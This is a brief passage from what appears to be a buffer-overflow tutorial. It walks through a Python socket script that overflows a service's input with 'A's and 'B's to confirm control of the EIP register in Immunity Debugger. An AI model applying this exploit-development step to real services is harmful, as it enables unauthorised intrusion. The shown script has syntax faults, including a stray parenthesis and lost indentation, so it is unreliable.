Run Immunity Debugger
 
The offset found in the previous page is the number of bytes needed to overwrite the Buffer and EBP. The EIP is an extra 4 bytes. We now want to overwrite the EIP with a return address to our shellcode.
 
### Gedit 3.py

#!/usr/bin/python3  
import sys, socket
 
shellcode = "A" * <offset> + "B" * 4
 
try:  
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  
s.connect(("<IP>",<PORT>))  
payload = "<Cmd_to_overflow> /.:/" + shellcode))  
s.send((payload.encode()))
 
s.close()
 
except:  
print("Error connecting to server")  
sys.exit()
 
### Chmod +x 3.py

### ./3.py
 
Analyze Immunity to see if the bytes are correct and the EBP is all A's (41414141) and EIP is all B's (42424242)